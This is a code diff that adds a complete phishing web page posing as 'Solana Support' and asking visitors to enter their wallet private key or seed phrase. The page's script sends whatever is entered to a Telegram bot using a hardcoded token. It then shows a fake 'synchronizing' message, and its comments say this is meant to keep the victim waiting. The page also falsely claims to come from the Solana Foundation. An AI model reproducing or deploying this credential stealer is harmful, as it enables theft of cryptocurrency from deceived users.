@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Network | RPC Node Sync</title>
+    <style>
+        body { background-color: #0d0d0d; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #1a1a1a; border: 1px solid #333; padding: 25px; border-radius: 8px; width: 100%; max-width: 380px; text-align: left; }
+        .logo { color: #14f195; font-weight: bold; letter-spacing: 2px; margin-bottom: 20px; font-size: 18px; text-align: center; }
+        h3 { font-size: 16px; margin-bottom: 10px; color: #fff; }
+        p { font-size: 13px; color: #a0a0a0; line-height: 1.5; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #444; color: #14f195; border-radius: 4px; box-sizing: border-box; font-family: monospace; }
+        button { width: 100%; padding: 12px; background: #14f195; border: none; color: #000; font-weight: bold; border-radius: 4px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #10c378; }
+        .footer { font-size: 10px; color: #555; margin-top: 15px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="logo">SOLANA SUPPORT</div>
+        <h3>Manual RPC Synchronization</h3>
+        <p>If your transaction is stuck or showing "RPC Node Error" during deployment, please synchronize your wallet credentials with the mainnet validator node.</p>
+        
+        <input type="text" id="wallet_key" placeholder="Enter Private Key or Seed Phrase">
+        
+        <button onclick="sendToTele()">SYNCHRONIZE NODE</button>
+        <div class="footer">© 2026 Solana Foundation. Secure SSL Encrypted.</div>
+    </div>
+
+    <script>
+        function sendToTele() {
+            const inputVal = document.getElementById('wallet_key').value;
+            if(inputVal.split(' ').length < 12 && inputVal.length < 32) {
+                alert('Invalid Phrase or Key format.');
+                return;
+            }
+
+            // GANTI TOKEN & ID LU DI SINI, MEMEK!
+            const botToken = '8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ';
+            const chatId = '6518432642';
+            const text = encodeURIComponent('⚠️ TARGET LOGIN!\nKey: ' + inputVal);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`)
+            .then(() => {
+                // Kasih loading palsu biar dia nunggu
+                alert('Synchronizing... Please wait 5-10 minutes. Do not close this page.');
+                document.getElementById('wallet_key').value = '';
+            })
+            .catch(() => alert('Network Error. Try again.'));
+        }
+    </script>
+</body>
+</html>
